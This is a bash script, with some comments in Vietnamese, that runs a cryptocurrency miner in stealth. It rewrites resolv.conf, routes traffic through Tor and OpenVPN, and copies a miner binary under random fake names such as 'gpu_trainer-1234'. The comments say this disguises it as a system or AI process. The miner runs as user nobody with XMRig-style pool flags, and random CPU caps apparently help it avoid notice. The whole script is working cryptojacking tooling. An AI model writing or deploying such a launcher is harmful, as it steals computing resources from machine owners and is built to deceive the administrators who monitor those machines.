#!/bin/bash

# Cấu hình DNS trước khi chạy OpenVPN
echo "nameserver 8.8.8.8" > /etc/resolv.conf
echo "nameserver 8.8.4.4" >> /etc/resolv.conf

# Start the Tor, Privoxy, and VPN services with configurations
sudo service tor restart
if ! pgrep -x "tor" > /dev/null; then
  echo "Tor service failed to start"
  exit 1
fi

# Start Privoxy with sudo
sudo service privoxy start
if ! pgrep -x "privoxy" > /dev/null; then
  echo "Privoxy service failed to start"
fi

# Start OpenVPN in the background and continue the script
sudo openvpn --config $VPN_CONFIG &
sleep 5  # Wait for OpenVPN to initialize
if ! pgrep -x "openvpn" > /dev/null; then
  echo "OpenVPN service failed to start"
fi

# Create model.txt file if it does not exist
if [ ! -f /root/model.txt ]; then
  touch /root/model.txt
fi

# Remove the old process file if it exists
if [ -f /usr/sbin/$(cat /root/model.txt) ]; then
  echo "Removing old process: $(cat /root/model.txt)"
  rm -f /usr/sbin/$(cat /root/model.txt)
fi

# List of valid system process names for disguising
SYSTEM_PROCESS_NAMES=("systemd" "sshd" "cron" "bash" "kworker" "dbus-daemon")

# Select a random system process name to disguise the actual process
RANDOM_SYSTEM_PROCESS=${SYSTEM_PROCESS_NAMES[$RANDOM % ${#SYSTEM_PROCESS_NAMES[@]}]}

# List of AI training-related process names
AI_PROCESS_NAMES=("ai_trainer" "deep_learning_worker" "neural_net" "model_optimizer" "tensor_processor" "gpu_trainer")

# Select a random AI process name
RANDOM_AI_NAME=${AI_PROCESS_NAMES[$RANDOM % ${#AI_PROCESS_NAMES[@]}]}

# Generate a random number
RANDOM_NUMBER=$(shuf -i 1000-9999 -n 1)

# Combine AI process name and random number to create the final process name
FINAL_NAME="${RANDOM_AI_NAME}-${RANDOM_NUMBER}"
echo $FINAL_NAME > /root/model.txt

# Copy the original systemdd file to the new process name
cp /usr/sbin/systemdd /usr/sbin/$FINAL_NAME

# Calculate the number of threads based on random CPU percentage
TOTAL_CORES=$(nproc)  
cpu_hint=$(shuf -i $CPU_MIN-$CPU_MAX -n 1)  
CPU_HINT=$(echo "($TOTAL_CORES * $cpu_hint) / 100" | bc)  

# Assign the process to multiple cores using taskset
CORE_SET=$(seq -s, 0 $(($TOTAL_CORES - 1)))  

# Limit total power consumption to 50% - 90% using cpulimit
TOTAL_SYSTEM_POWER=$(($TOTAL_CORES * 100))  
CPU_LIMIT_PERCENT=$(shuf -i 50-90 -n 1) 
CPU_LIMIT=$(($TOTAL_SYSTEM_POWER * $CPU_LIMIT_PERCENT / 100)) 

# Start the systemdd process under the nobody user and disguise it as a system process
echo "Starting the process disguised as: $FINAL_NAME (wrapped under the system process: $RANDOM_SYSTEM_PROCESS)"
sudo -u nobody cpulimit -l $CPU_LIMIT -- taskset -c $CORE_SET torsocks /usr/sbin/$FINAL_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages --cpu-max-threads-hint=$CPU_HINT --tls --proxy=socks5://127.0.0.1:9050

# Keep the process running
tail -f /dev/null
